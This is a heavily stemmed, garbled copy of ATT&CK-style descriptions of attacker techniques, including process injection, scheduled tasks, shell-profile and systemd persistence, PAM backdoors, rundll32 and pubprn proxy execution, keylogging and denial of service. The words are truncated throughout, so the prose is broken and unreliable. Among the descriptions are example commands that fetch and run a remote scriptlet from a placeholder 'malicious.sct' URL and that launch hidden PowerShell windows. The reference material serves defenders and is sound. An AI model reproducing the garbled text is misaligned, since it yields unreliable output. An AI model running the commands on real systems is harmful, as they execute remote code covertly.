extr window mem inject
advers inject malicy cod process via extr window mem ewm ord evad process-based defens wel poss elev privileg ewm inject method execut arbit cod address spac sep liv process cre window graph windows-based process must prescrib reg window class stip appear behavy via window proc funct handl input/output dat microsoft window class reg new window class includ request 40 byt ewm append alloc mem inst class ewm intend stor dat spec window spec apply program interfac ap funct set get valu microsoft getwindowlong funct microsoft setwindowlong funct although smal ewm larg enough stor 32-bit point oft us point window proc malw poss util mem loc part attack chain includ writ cod shar sect process ’ mem plac point cod ewm invok execut return execut control address process ’ ewm execut grant ewm inject allow access target process mem poss elev privileg writ payload shar sect also avoid us high monit ap cal < cod > writeprocessmem < /code > < cod > createremotethread < /code > elast process inject july 2017 soph malw sampl also pot bypass protect mech dat execut prev dep trig combin window proc system funct rewrit malicy payload insid execut port target process malwaretech pow load aug 2013 welivesec gapz redym mar 2013 run cod context anoth process allow access process mem system/network resourc poss elev privileg execut via ewm inject also evad detect sec produc sint execut mask legitim process
schedule task
advers abus window task scheduler perform task schedule init rec execut malicy cod multipl way access task scheduler window schtasks http util run direct command lin task scheduler op gui within admin tool sect control panel cas advers us .net wrap window task scheduler altern advers us window netapi32 libr cre schedule task deprec http util could also abus advers ex http though < cod > at.exe < /code > access task cre < cod > schtasks < /code > control panel advers us window task scheduler execut program system startup schedule bas persist window task scheduler also abus conduc remot execut part lat mov and/or run process context spec account system simil system bin proxy execut http advers also abus window task scheduler pot mask one-tim execut signed/trust system process proofpoint serp advers also cre hid schedule task i.e hid artifact http vis defend tool man query us enum task spec advers hid task ` schtasks /query ` task scheduler delet assocy sec describ sd reg valu delet valu must complet us system permit sigmahq tarrask schedule task advers also employ altern method hid task alt metadat ` index ` valu within assocy reg key defend schedule task attack window environ
socket filt
advers attach filt network socket monit act backdo us persist command control elev permit advers us feat ` libpcap ` libr op socket instal filt allow disallow certain typ dat com socket filt apply traff pass spec network interfac every interfac spec network interfac receiv packet match filt crit addit act trig host act revers shel est connect advers send craft packet target host match inst filt crit haking9 libpcap network sniff advers us socket filt trig instal impl conduc ping back invok command shel commun socket filt also us conjunct protocol tunnel http exatrack bpf filt pass backdo leonardo turl penquin 2020 filt inst unix-like platform ` libpcap ` inst window host us ` winpcap ` advers us eith ` libpcap ` ` pcap_setfilter ` standard libr funct ` setsockopt ` ` so_attach_filter ` opt sint socket connect act packet receiv behavy difficult detect due lack act host low cpu overhead limit vis raw socket us
ind remov tool
malicy tool detect quarantin otherw curtail advers abl determin malicy tool detect ind mod tool remov ind us upd vert long detect target defend system subsequ target us simil system good exampl malw detect fil sign quarantin anti-virus softw advers determin malw quarantin fil sign us softw pack http otherw mod fil diff sign re-us malw
arch via util
advers us util compress and/or encrypt collect dat pri exfilt many util includ funct compress encrypt otherw pack dat form easier/more sec transport advers abus vary util compress encrypt dat exfilt third party util preinstal < cod > tar < /code > linux maco < cod > zip < /code > window system window < cod > diantz < /code > < cod > makecab < /code > us pack collect fil cabinet .cab fil < cod > diantz < /code > also us download compress fil remot loc i.e remot dat stag http diantz.exe_lolbas addit < cod > xcop < /code > window cop fil direct vary opt advers us also third party util 7-zip winr winzip perform simil act 7zip homep winr homep winzip homep
vnc
advers us valid account http remot control machin us virt network comput vnc vnc platform-independent desktop shar system us rfb “ remot framebuff ” protocol en us remot control anoth comput ’ display relay screen mous keyboard input network remot framebuff protocol vnc diff remot desktop protocol http vnc screen-sharing softw rath resource-sharing softw default vnc us system auth config us cred spec vnc maco vnc softw remot desktop vnc auth advers abus vnc perform malicy act logged-on us op docu download fil run arbit command advers could us vnc remot control monit system collect dat inform pivot system within network spec vnc libraries/implementation also suscept brut forc attack mem us exploit hijack vnc maco root vnc login without auth vnc vuln offend sec vnc auth check attack vnc serv pentestlab havan auth bug
window man instru
advers abus window man instru wmi execut malicy command payload wmi admin feat provid uniform environ access window system compon wmi serv en loc remot access though lat facilit remot serv http distribut compon object model http dcom window remot man http winrm msdn wmi remot wmi dcom op us port 135 wherea wmi winrm op port 5985 us http 5986 http msdn wmi fireey wmi 2015 advers us wmi interact loc remot system us mean execut vary behavy gath inform discovery wel remot execut fil part lat mov fireey wmi san 2015 fireey wmi 2015
malicy shel mod
advers est persist execut malicy command trig us ’ shel us shel execut sev config script diff point throughout sess bas ev exampl us op command lin interfac remot log ssh login shel in login shel execut script system /etc us ’ hom direct ~/ config environ login shel system us < cod > /etc/profile < /code > in config script run permit level direct oft us set environ vary cre alia custom us ’ environ shel exit termin addit shel script execut ens shel exit appropry advers attempt est persist insert command script autom execut shel us bash exampl default shel gnu/linux system advers ad command launch malicy bin < cod > /etc/profile < /code > < cod > /etc/profile.d < /code > fil intezer-kaiji-malware fil requir root permit execut tim shel system launch us level permit advers insert malicy command < cod > ~/.bash_profile < /code > < cod > ~/.bash_login < /code > < cod > ~/.profile < /code > rock sourc us op command lin interfac connect remot advers oft us ~/.bash_profile sint system execut first fil ex list ord advers also lev < cod > ~/.bashrc < /code > fil tsunam rock linux rabbit magento addit execut connect est remot addit interact shel op new tab command lin interfac malw target termin program trig execut cannon advers us < cod > ~/.bash_logout < /code > fil execut malicy command end sess pearl_shellbot maco funct techn simil lev zsh default shel maco 10.15+ terminal.app op apply launch zsh login shel zsh interact shel login shel config system environ us < cod > /etc/profile < /code > < cod > /etc/zshenv < /code > < cod > /etc/zprofile < /code > < cod > /etc/zlogin < /code > login shel config us environ < cod > ~/.zprofile < /code > < cod > ~/.zlogin < /code > interact shel us < cod > ~/.zshrc < cod > config us environ upon exit < cod > /etc/zlogout < /code > < cod > ~/.zlogout < /code > execut leg program maco execut < cod > /etc/bashrc < /code > startup
screen capt
advers attempt tak screen capt desktop gath inform cours op screen capt funct includ feat remot access tool us post-compromise op tak screenshot also typ poss nat util ap cal < cod > copyfromscreen < /code > < cod > xwd < /code > < cod > screencapture < /code > copyfromscreen .net ant mac malw
bootkit
bootkit malw vary mod boot sect hard driv includ mast boot record mbr volum boot record vbr mtrends 2016 advers us bootkit persist system lay op system mak difficult perform ful remedy unless org suspect on us act accord mast boot record mbr sect disk first load complet hardw init bio loc boot load advers raw access boot driv overwrit are divert execut startup norm boot load advers cod lau 2011 volum boot record mbr pass control boot process vbr simil cas mbr advers raw access boot driv overwrit vbr divert execut startup advers cod
boot logon init script
advers us script autom execut boot logon init est persist init script us perform admin funct oft execut program send inform intern log serv script vary bas op system wheth apply loc remot advers us script maintain persist singl system depend access config logon script eith loc cred admin account necess advers also abl esc privileg sint boot logon init script run high privileg
adversary-in-the-middle
advers attempt posit two network dev us adversary-in-the-middle aitm techn support follow-on behavy network sniff http transmit dat manip http abus feat common network protocol determin flow network traff e.g arp dns llmnr etc advers forc dev commun advers control system collect inform perform addit act rapid7 mitm bas exampl advers manip victim dns set en malicy act preventing/redirect us access legitim sit and/or push addit malw ttint_r dns_changer_trojans ad_blocker_with_miner advers also manip dns lev posit ord interceiv us cred sess cooky volexity_0day_sophos_fw downgrad attack http also us est aitm posit negoty le sec deprec weak vert commun protocol ssl/tls encrypt algorithm mitm_tls_downgrade_att taxonomy_downgrade_att_tls tlseminar_downgrade_att advers also lev aitm posit attempt monit and/or mod traff transmit dat manip http advers setup posit simil aitm prev traff flow appropry destin pot impair defens http and/or support network den serv http
system owner/us discovery
advers attempt ident prim us cur log us set us common us system wheth us act us system exampl retriev account usernam us o cred dump http inform collect numb diff way us discovery techn us usernam detail prev throughout system includ run process own file/directory own sess inform system log advers us inform system owner/us discovery http autom discovery shap follow-on behavy includ wheth advers ful infect target and/or attempt spec act vary util command acquir inform includ < cod > whoam < /code > maco linux cur log us ident < cod > w < /code > < cod > < /code > maco < cod > dscl list /users | grep -v ' _ ' < /code > command also us enum us account environ vary < cod > usernam < /code > < cod > us < /code > also us access inform
acquir infrastruct
advers buy leas rent infrastruct us target wid vary infrastruct ex host orchest advers op infrastruct solv includ phys cloud serv domain third-party web serv trendmicrohideoutsleas addit botnet avail rent purchas us infrastruct solv allow advers stag launch execut op solv help advers op blend traff see norm contact third-party web serv depend impl advers us infrastruct mak difficult phys tie back wel util infrastruct rapid provid mod shut
rundll32
advers abus rundll32.exe proxy execut malicy cod us rundll32.exe vic execut direct i.e shar mod http avoid trig sec tool monit execut rundll32.exe process allowl fals posit norm op rundll32.exe common assocy execut dll payload ex < cod > rundll32.exe dllname dllfunction < /code > rundll32.exe also us execut control panel http item fil .cpl undocu shell32.dl funct < cod > control_rundl < /code > < cod > control_rundllasuser < /code > double-clicking .cpl fil also caus rundll32.exe execut trend micro cpl rundll32 also us execut script javascrib do us syntax simil < cod > rundll32.exe javascrib \ .. \mshtml runhtmlapply document.write getobject script http exampl com/malicious.sct < /code > behavy see us malw powelik sec command lin confus advers also attempt obsc malicy cod analys abus man rundll32.exe load dll funct nam part window compat support vary charact set rundll32.exe first check wide/unicod ans character-supported funct load spec funct giv command < cod > rundll32.exe exampledll.dl examplefunct < /code > rundll32.exe would first attempt execut < cod > examplefunctionw < /code > fail < cod > examplefunction < /code > load < cod > examplefunct < /code > advers theref obsc malicy cod cre multipl id export funct nam append < cod > w < /code > and/or < cod > < /code > harmless on attack rundll32.exe obsc github norundl dll funct also export execut ordin numb ex < cod > rundll32.exe file.dll 1 < /code > addit advers us masquerad http techn chang dll fil nam fil extend funct nam cont execut malicy payload rundll32.exe defens evas
contain resourc discovery
advers attempt discov contain resourc avail within contain environ resourc includ im deploy pod nod inform stat clust resourc view within web apply kubernet dashboard query via dock kubernet ap dock ap kubernet ap dock log leak inform environ environ ’ config serv avail cloud provid victim util discovery resourc inform advers ’ next step environ perform lat mov method util execut
serverless
advers purchas config serverless cloud infrastruct cloudfl work aw lambd funct us target util serverless infrastruct advers mak difficult attribut infrastruct us op back acquir serverless runtim environ lev eith respond direct infect machin proxy http traff adversary-owned command control serv blackw malw cloudfl work aw lambd redirect traff gen funct appear com subdomain common cloud provid difficult distinct ordin traff provid detect command control cloud blackw malw cloudfl work
hid window
advers impl hid window cont malicy act plain sight us cas window would typ display apply carry op hid util system admin avoid disrupt us work environ carry admin task advers abus op system funct hid otherw vis window us alert us advers act system window vary feat script langu window powershel http jscript vbscript mak window hid on exampl < cod > powershell.exe -windowstyle hid < /code > powershel 2019 mac config apply run maco list property list plist fil on tag fil < cod > apple.awt.uielement < /code > allow jav apply prev apply icon appear dock common us apply run system tray n't also want show dock howev advers abus feat hid run window ant mac malw
lc_load_dylib addit
mach-o bin sery head us perform certain op bin load lc_load_dylib head mach-o bin tel maco o x dynam libr dylib load execut tim ad ad-hoc compil bin long adjust mak rest field depend writ bad malw osx tool avail perform chang chang invalid digit sign bin bin mod advers remedy issu simply remov lc_code_signature command bin sign ’ check load tim malw persist o x
standard encod
advers encod dat standard dat encod system mak cont command control traff difficult detect command control c2 inform encod us standard dat encod system adh ex protocol spec common dat encod scheme includ asci unicod hexadecim base64 mim wikiped binary-to-text encod wikiped charact encod dat encod system also result dat compress gzip
emb payload
advers emb payload within fil cont malicy cont defens otherw seem benign fil script execut abus carry obfusc malicy payload cont cas emb payload also en advers subvert trust control http impact execut control digit sign not ticket sentinel lab advers emb payload vary fil form hid payload microsoft learn simil steganograph http though involv weav malicy cont spec byt pattern rel legitim digit med form github psim exampl advers observ emb payload within overlay otherw benign bin securel dtrack2 advers also observ nest payload execut run-only script insid fil form sentinellab revers run-only applescrib 2021 emb cont also us process inject http payload us infect benign system process trend micro emb inject payload us part mod malw design provid spec feat encrypt c2 commun support orchest mod exampl emb mod inject default brows allow advers commun via network malw analys report comr
plist mod
property list plist fil contain inform maco o x us config apply serv fil utf-8 encod form lik xml docu via sery key surround < > detail program execut fil path execut program argu requir o permit many oth plist loc certain loc depend purpos < cod > /library/preferences < /code > execut elev privileg < cod > ~/library/preferences < /code > execut us privileg advers mod plist fil point cod us execut cod context anoth us bypass whitel proc ev us persist mech sof komplex trod
plug auth mod
advers mod plug auth mod pam access us cred en otherw unwar access account pam modul system config fil libr execut fil guid auth many serv common auth mod < cod > pam_unix.so < /code > retriev set ver account auth inform < cod > /etc/passwd < /code > < cod > /etc/shadow < /code > appl pam man pam_unix red hat pam advers mod compon pam system cre backdo pam compon < cod > pam_unix.so < /code > patch acceiv arbit advers supply valu legitim cred pam backdo malicy mod pam system also abus ste cred advers infect pam resourc cod harvest us cred sint valu exchang pam compon plain-text sint pam stor password pam cred appl pam
revert cloud inst
advers revert chang mak cloud inst perform malicy act attempt evad detect remov evid pres high virt environ cloud-bas infrastruct accompl rest virt machin vm dat stor snapshot cloud man dashboard cloud ap anoth vary techn util temp stor attach comput inst cloud provid provid vary typ stor includ persist loc and/or ephem ephem typ oft reset upon stop/restart vm tech republ - rest aw snapshot googl - rest cloud snapshot
histcontrol
< cod > histcontrol < /code > environ vary keep track sav < cod > hist < /code > command ev < cod > ~/.bash_history < /code > fil us log set config ign command start spac simply set ignorespac < cod > histcontrol < /code > also set ign duply command set ignoredup linux system set default ignorebo cov prevy exampl mean “ l ” sav “ l ” would sav hist < cod > histcontrol < /code > ex default maco set us respect advers us op without leav trac simply prepend spac termin command
gath victim host inform
advers gath inform victim host us target inform host includ vary detail includ admin dat ex nam assign ip funct etc wel spec regard config ex op system langu etc. advers gath inform vary way direct collect act via act scan http phish inform http advers also comprom sit includ malicy cont design collect host inform visit scanbox inform host also expos advers via onlin access dat set ex soc med http search victim-owned websit http gath inform rev opportun form reconnaiss ex search op websites/domain http search op techn databas http est op resourc ex develop cap http obtain cap http and/or init access ex supply chain comprom http extern remot serv http
digit cert
advers search publ digit cert dat inform victim us target digit cert issu cert auth ca ord cryptograph ver origin sign cont cert us encrypt web traff http ssl/tls commun contain inform reg org nam loc advers search digit cert dat gath act inform threat act us onlin resourc lookup tool harvest inform cert sslshopper lookup digit cert dat also avail artifact sign org ex cert us encrypt web traff serv cont med ssl cert inform sourc rev opportun form reconnaiss ex act scan http phish inform http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http trust rel http
keylog
advers log us keystrok interceiv cred us typ keylog lik us acquir cred new access opportun o cred dump http effort effect requir advers interceiv keystrok system subst period tim cred success capt keylog prev typ input capt many diff way interceiv keystrok adv keystrok method includ hook ap callback us process keystrok unlik cred ap hook http foc sol ap funct intend process keystrok dat read raw keystrok dat hardw buff window reg mod custom driv mod system im http provid advers hook op system network dev read raw keystrok login sess cisco blog leg dev attack
linux mac fil direct permit mod
advers mod fil direct permissions/attribute evad access control list ac access protect fil hybrid analys icacls1 jun 2018 hybrid analys icacls2 2018 fil direct permit common man ac config fil direct own us appropry permit fil direct ac impl vary platform gen explicit design us group perform act read writ execut etc. linux linux-based platform provid standard set permit group us group standard set permit read writ execut apply group nuant platform ’ permit impl vary platform provid two prim command us manip fil direct ac < cod > chown < /code > short chang own < cod > chmod < /code > short chang mod advers us command mak own fil direct chang mod cur permit allow could subsequ lock oth fil spec fil direct mod requir step many techn est persist via unix shel config mod http tainting/hijack instru binary/configuration fil via hijack execut flow http 20 maco common tool techn
password guess
advers pri knowledg legitim cred within system environ guess password attempt access account without knowledg password account advers opt system guess password us repetit it mech advers guess login cred without pri knowledg system environ password op us list common password password guess tak account target policy password complex us policy lock account numb fail attempt guess password risky opt could caus num auth fail account lockout depend org login fail policy cyl cleav typ man serv common us port us guess password common target serv includ follow ssh 22/tcp telnet 23/tcp ftp 21/tcp netbio / smb / samb 139/tcp 445/tcp ldap 389/tcp kerbero 88/tcp rdp / termin serv 3389/tcp http/http man serv 80/tcp 443/tcp mssql 1433/tcp orac 1521/tcp mysql 3306/tcp vnc 5900/tcp snmp 161/udp 162/tcp/udp addit man serv advers target singl sign-on sso cloud-bas apply util fed auth protocol wel extern fac email apply off 365 us-cert ta18-068 2018 advers abus network dev interfac ` wlanap ` brut forc access wifi-router via wireless auth protocol trend micro emotet 2020 default environ ldap kerbero connect attempt le lik trig ev smb cre window logon fail ev id 4625
pubprn
advers us pubprn proxy execut malicy remot fil pubprn.vbs vis bas http script publ print act direct domain serv script sign microsoft common execut window command shel http via < cod > cscript.exe < /code > exampl follow cod publ print within spec domain < cod > cscript pubprn printer1 ldap dc=domain1 dc=com < /code > pubprn advers abus pubprn execut malicy payload host remot sit enigma0x3 pubprn bypass advers set second < cod > script < /code > paramet ref scriptlet fil .sct host remot sit exampl command < cod > pubprn.vbs 127.0.0.1 script http < /code > behavy bypass sign valid restrict apply control solv account abus script lat vert window 10+ < cod > pubprn.vbs < /code > upd prev proxy execut remot sit do limit protocol spec second paramet < cod > ldap < /code > vic < cod > script < /code > monik could us ref remot cod via http
purchas techn dat
advers purchas techn inform victim us target inform victim avail purchas within reput priv sourc databas pay subscrib fee scan databas dat aggreg serv advers also purchas inform less-reputable sourc dark web cybercrim blackmarket advers purchas inform already ident target us purchas dat discov opportun success breach threat act gath vary techn detail purchas dat includ limit employ contact inform cred spec regard victim ’ infrastruct zdnet sel dat inform sourc rev opportun form reconnaiss ex phish inform http search op websites/domain http est op resourc ex develop cap http obtain cap http and/or init access ex extern remot serv http valid account http
o cred dump
advers attempt dump cred obtain account login cred mat norm form hash clear text password op system softw cred us perform lat mov http access restrict inform sev tool ment assocy sub-techniques us advers profess sec test addit custom tool lik ex wel
shar mod
advers execut malicy payload via load shar mod window mod load instruct load dlls arbit loc path arbit univers nam conv unt network path funct resid ntdll.dll part window nat ap http cal funct lik < cod > createprocess < /code > < cod > loadlibr < /code > etc win32 ap wikiped window libr fil mod load load dlls via spec fully-qualified rel dll pathnam import direct via export forward anoth dll spec fully-qualified rel pathnam without extend via ntfs junct symlink program.exe.local fully-qualified rel pathnam direct contain dlls spec import direct forward export via < cod > x3c fil name= filename.extension loadfrom= fully-qualified rel pathnam x3e < /code > emb extern apply manifest fil nam ref entry import direct forward export advers us funct way execut arbit payload victim system exampl malw execut shar mod load addit compon feat
dat config reposit
advers collect dat rel man dev config reposit config reposit us man system ord config man control dat remot system config reposit also facilit remot access admin dev advers target reposit ord collect larg quant sensit system admin dat dat config reposit expos vary protocol softw stor wid vary dat much align advers discovery object us-cert-ta18-106a us-cert ta17-156 snmp abus 2017
disk structure wip
advers corrupt wip disk dat structure hard driv necess boot system target spec crit system larg numb network interrupt avail system network resourc advers attempt rend system un boot overwrit crit dat loc structure mast boot record mbr partit tabl symantec shamoon 2012 fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017 unit 42 shamoon3 2018 dat contain disk structure includ init execut cod load op system loc fil system partit disk inform pres comput abl load op system boot process leav comput unavail disk structure wip http perform isol along disk cont wip http sect disk wip maxim impact target org malw design destroy disk structure worm-like feat prop across network lev techn lik valid account http o cred dump http smb/windows admin shar http symantec shamoon 2012 fireey shamoon nov 2016 palo alto shamoon nov 2016 kaspersky stonedril 2017
direct network flood
advers attempt caus den serv do direct send high-volume network traff target do attack also reduc avail funct target system network direct network flood http on system us send high-volume network packet toward target serv network almost network protocol us flood stateless protocol udp icmp common us stat protocol tcp us wel botnet common us conduc network flood attack network serv larg botnet gen sign amount traff system spread across glob internet advers resourc build control botnet infrastruct rent tim ex botnet conduc attack worst cas distribut do ddo many system us gen flood on nee send smal amount traff produc enough volum sat target network circumst distinct ddo traff legitim cli becom excess difficult botnet us high-profile ddo flood attack 2012 sery incid target maj u bank usny iranianbotnet march 2016
stor dat manip
advers insert delet manip dat rest ord manip extern outcom hid act fireey apt38 oct 2018 doj lazar sony 2018 manip stor dat advers attempt affect busy process org understand decid mak stor dat could includ vary fil form off fil databas stor email custom fil form typ mod impact depend typ dat wel goal object advers complex system advers would lik nee spec expert poss access spec softw rel system would typ gain prolong inform gath campaign ord desir impact
path interceiv path environ vary
advers execut malicy payload hijack environ vary us load libr advers plac program ear entry list direct stor path environ vary window execut search sequ path list search bin cal script command lin path environ vary contain list direct certain method execut program nam us cmd.exe command-line rely sol path environ vary determin loc search program path program giv direct list path environ vary window direct < cod > systemroot \system32 < /code > < cod > c \windows\system32 < /code > program plac prec direct nam window program cmd powershel python execut command execut script command-line exampl < cod > c \example path < /code > prec < /code > c \windows\system32 < /code > path environ vary program nam net.exe plac < cod > c \example path < /code > cal instead window system net net execut command-line
sharepoint
advers lev sharepoint reposit sourc min valu inform sharepoint oft contain us inform advers learn structure funct intern network system exampl follow list exampl inform hold pot valu advers also find sharepoint policy proc standard phys / log network diagram system architect diagram techn system docu test / develop cred work / project schedule sourc cod snippet link network shar intern resourc
direct volum access
advers direct access volum bypass fil access control fil system monit window allow program direct access log volum program direct access read writ fil direct driv analys fil system dat structure techn bypass window fil access control wel fil system monit tool hakoby 2009 util ninjacop ex perform act powershel github powersploit ninjacop
fil system permit weak
process autom execut spec bin part funct perform act permit fil system direct contain target bin permit bin improp set target bin overwrit anoth bin us user-level permit execut origin process origin process thread run high permit level replac bin also execut higher-level permit could includ system advers us techn replac legitim bin malicy on mean execut cod high permit level execut process set run spec tim certain ev system bootup techn also us persist serv manip window serv bin on vary techn advers replac legitim serv execut execut gain persist and/or privileg esc account context serv set execut local/domain account system localserv networkserv serv start eith direct us appropry access avail mean system restart serv start bootup replac execut run instead origin serv execut execut instal anoth vary techn perform tak adv weak common execut self-extracting instal instal process common instal us subdirect within < cod > temp < /code > direct unpack bin dlls ex payload instal cre subdirect fil oft set appropry permit restrict writ access allow execut untrust cod plac subdirect overwrit bin us instal process behavy rel tak adv dll search ord hijack http instal also requir elev privileg result privileg esc execut advers control cod behavy rel bypass us account control http sev exampl weak ex common instal report softw vend mozill firefox instal dll hijack sec kanthak 7zip instal
email hid rul
advers us email rul hid inbound email comprom us mailbox many email cli allow us cre inbox rul vary email funct includ mov email fold mark email read delet email rul cre mod within email cli extern feat < cod > new-inboxrule < /code > < cod > set-inboxrule < /code > powershel http cmdlets window system microsoft inbox rul maco email rul microsoft new-inboxrule microsoft set-inboxrule advers util email rul within comprom us mailbox delet and/or mov email le not fold advers hid sec alert c2 commun respons intern spearph http email send comprom account us admin within org advers valid cred abl cre rul autom mov delet email rul abus impair/delay detect email cont immedy see us defend malicy rul common filt email bas key word < cod > malw < /code > < cod > suspicy < /code > < cod > phish < /code > < cod > hack < /code > find mess body subject lin microsoft cloud ap sec
extern defac
advers defac system extern org attempt del mess intimid otherw mislead org us extern defac http ultim caus us distrust system question/discredit system ’ integr externally-facing websit common victim defac oft target advers hackt group ord push polit mess spread propagand fireey cyb threat med industry kevin mand stat u sen commit intellig anonym hack defac russ govt sit extern defac http us catalyst trig ev respons act tak org govern simil websit defac also us setup precurs fut attack drive-by comprom http trend micro deep div defac
llmnr/nbt-ns poison relay
link-local multicast nam resolv llmnr netbio nam serv nbt-ns microsoft window compon serv altern method host id llmnr bas upon domain nam system dns form allow host loc link perform nam resolv host nbt-ns ident system loc network netbio nam wikiped llmnr technet netbio advers spoof authorit sourc nam resolv victim network respond llmnr udp 5355 /nbt-ns udp 137 traff know id request host effect poison serv victim commun advers control system request host belong resourc requir identification/authenticat usernam ntlmv2 hash send advers control system advers collect hash inform send wir tool monit port traff network sniff http crack hash offlin brut forc http obtain plaintext password cas advers access system auth path system autom scan us cred attempt auth advers control system ntlmv2 hash interceiv relay access execut cod target system relay step hap conjunct poison also independ byt3bl33d3r ntlm relay sec ide smb relay sev tool ex us poison nam serv within loc network nbnspoof metasploit respond http github nbnspoof rapid7 llmnr spoof github respond
ip address
advers gath victim ip address us target publ ip address alloc org block rang sequ address inform assign ip address includ vary detail ip address us ip address also en advers der detail victim org siz phys loc internet serv provid where/how publicly-facing infrastruct host advers gath inform vary way direct collect act via act scan http phish inform http inform assign ip address also expos advers via onlin access dat set ex search op techn databas http who dns dumpst circ pass dns gath inform rev opportun form reconnaiss ex act scan http search op websites/domain http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex extern remot serv http
o exhaust flood
advers launch den serv do attack target endpoint op system o system o respons man finit resourc wel prev entir system overwhelm excess demand capac attack nee exhaust act resourc system attack simply exhaust limit avail resourc o self-imposes diff way achiev ex includ tcp state-exhaustion attack syn flood ack flood arb annualdosreport jan 2018 syn flood excess amount syn packet send 3-way tcp handshak nev complet o maxim numb concur tcp connect allow quick exhaust abl system receiv new request tcp connect thu prev access tcp serv provid serv cloudfl synflood ack flood lev stat nat tcp protocol flood ack packet send target forc o search stat tabl rel tcp connect already est ack packet connect ex o search entir stat tabl confirm match ex necess larg flood packet comput requir caus serv becom slug and/or unrespond due work must elimin rog ack packet gre reduc resourc avail provid target serv corero syn-ackflood
rootkit
advers us rootkit hid pres program fil network connect serv driv system compon rootkit program hid ex malw intercepting/hook mod op system ap cal supply system inform symantec window rootkit rootkit rootkit en funct resid us kernel level op system low includ hyperv mast boot record system firmw http wikiped rootkit rootkit see window linux mac o x system crowdstrik linux rootkit blackh mac osx rootkit
powershel profil
advers gain persist elev privileg execut malicy cont trig powershel profil powershel profil < cod > profile.ps1 < /code > script run powershel http start us logon script custom us environ powershel http support sev profil depend us host program exampl diff profil powershel http host program powershel consol powershel is vis studio cod admin also config profil apply us host program loc comput microsoft profil advers mod profil includ arbit command funct mod and/or powershel http driv gain persist every tim us op powershel http sess mod script execut unless < cod > -noprofile < /code > flag us launch eset turl powershel 2019 advers also abl esc privileg script powershel profil load execut account high privileg domain admin wit end shady powershel profil
javascrib
advers abus vary impl javascrib execut javascrib j platform-independent script langu compil just-in-time runtim common assocy script webp though j execut runtim environ outsid brows nodes jscript microsoft impl script standard jscript interpret via window script engin thu integr many compon window compon object model http internet expl html apply hta pag jscrip 2018 microsoft jscript 2007 microsoft window script javascrib autom jxa maco script langu bas javascrib includ part appl ’ op script architect os introduc osx 10.10. appl ’ os provid script cap control apply interfac op system bridg access rest appl ’ intern ap osx 10.10 os support two langu jxa applescrib http script execut via command lin util < cod > osascrib < /code > compil apply script fil via < cod > osacompil < /code > compil execut mem program lev osakit framework appl mac script 2016 specterop jxa 2020 sentinelon maco red team red can silv sparrow feb2021 mdsec maco jxa vscode advers abus vary impl javascrib execut vary behavy common us includ host malicy script websit part drive-by comprom http download execut script fil second payload sint payload text-based also common advers obfusc cont part obfusc fil inform http
dns
advers gath inform victim dns us target dns inform includ vary detail includ reg nam serv wel record outlin address target ’ subdomain mail serv host dns mx txt spf record also rev us third party cloud saa provid off 365 g suit salesforc zendesk sean metcalf twit dns record advers gath inform vary way query otherw collect detail via dns/passive dns http dns inform also expos advers via onlin access dat set ex search op techn databas http dns dumpst circ pass dns gath inform rev opportun form reconnaiss ex search op techn databas http search op websites/domain http act scan http est op resourc ex acquir infrastruct http comprom infrastruct http and/or init access ex extern remot serv http
systemd serv
systemd serv us est persist linux system systemd serv man common us man background daemon process also know serv system resourc linux man-pages systemd janu 2014 freedesktop.org linux systemd 29sep2018 systemd default init init system many linux distribut start deb 8 ubuntu 15.04 cento 7 rhel 7 fedor 15 replac leg init system includ sysvinit upstart remain backward compat af init system systemd util config fil know serv unit control serv boot condit default unit fil stor < cod > /etc/systemd/system < /code > < cod > /usr/lib/systemd/system < /code > direct fil extend < cod > .service < /code > serv unit fil contain num direct execut system command execstart execstartpr execstartpost direct cov execut command serv start man 'systemctl ' system start serv set autom start execreload direct cov serv restart execstop execstoppost direct cov serv stop man 'systemctl ' advers us systemd funct est persist access victim system cre and/or mod serv unit fil caus systemd execut malicy command rec interv system boot anomal rock march 2019 gist arch pack comprom 10jul2018 arch linux pack systemd comprom bleepingcomput 10jul2018 acroread pack comprom arch linux mail 8jul2018 advers typ requir root privileg create/modify serv unit fil < cod > /etc/systemd/system < /code > < cod > /usr/lib/systemd/system < /code > direct low privileg us create/modify serv unit fil direct < cod > ~/.config/systemd/user/ < /code > achiev user-level persist rapid7 serv persist 22june2016
elev execut prompt
advers lev authorizationexecutewithprivileg ap esc privileg prompt us cred appledoc authorizationexecutewithprivileg purpos ap giv apply develop easy way perform op root privileg apply instal upd ap valid program request root privileg com reput sourc malicy mod although ap deprec stil ful funct latest releas maco cal ap us prompt ent cred check origin integr program mak program cal ap also load world writ fil mod perform malicy behavy elev privileg advers abus authorizationexecutewithprivileg obtain root privileg ord instal malicy softw victim instal persist mech dea 1000 instal break carbon black shlayer feb 2019 osx coldroot rat techn combin masquerad http trick us grant esc privileg malicy cod dea 1000 instal break carbon black shlayer feb 2019 techn also show work mod legitim program pres machin mak us ap dea 1000 instal break
audio capt
advers lev comput periph dev microphon webcam apply voic video cal serv capt audio record purpos list sensit convers gath inform malw script us interact dev avail ap provid op system apply capt audio audio fil writ disk exfilt lat
cre mod system process
advers cre mod system-level process rep execut malicy payload part persist op system boot start process perform background system funct window linux system process ref serv technet serv maco launchd process know launch daemon http launch ag http run fin system init load us spec paramet appledoc launch ag daemon advers instal new serv daemon ag config execut startup rep interv ord est persist simil advers mod ex serv daemon ag achiev effect serv daemon ag cre admin privileg execut root/system privileg advers lev funct cre mod system process ord esc privileg osx malw detect
extern remot serv
advers lev external-facing remot serv init access and/or persist within network remot serv vpns citrix access mech allow us connect intern enterpr network resourc extern loc oft remot serv gateway man connect cred auth serv serv window remot man http vnc http also us extern maco vnc softw remot desktop access valid account http us serv oft requir could obtain cred pharm obtain cred us comprom enterpr network volex virt priv keylog access remot serv us redund persist access mech op access also gain expos serv ’ requir auth contain environ includ expos dock ap kubernet ap serv kubelet web apply kubernet dashboard trend micro expos dock serv unit 42 hildegard malw
compon firmw
advers employ soph mean comprom comput compon instal malicy firmw execut advers cod outsid op system main system firmw bio techn simil system firmw http conduc upon system compon cap level integr check malicy dev firmw could provid persist level access system despit pot typ fail maintain access hard disk re-images wel way evad host software-based defens integr check
lc_load_dylib addit
advers est persist execut malicy cont trig execut taint bin mach-o bin sery head us perform certain op bin load lc_load_dylib head mach-o bin tel maco o x dynam libr dylib load execut tim ad ad-hoc compil bin long adjust mak rest field depend writ bad malw osx tool avail perform chang advers mod mach-o bin head load execut malicy dylib every tim bin execut although chang invalid digit sign bin bin mod remedy simply remov lc_code_signature command bin sign ’ check load tim malw persist o x
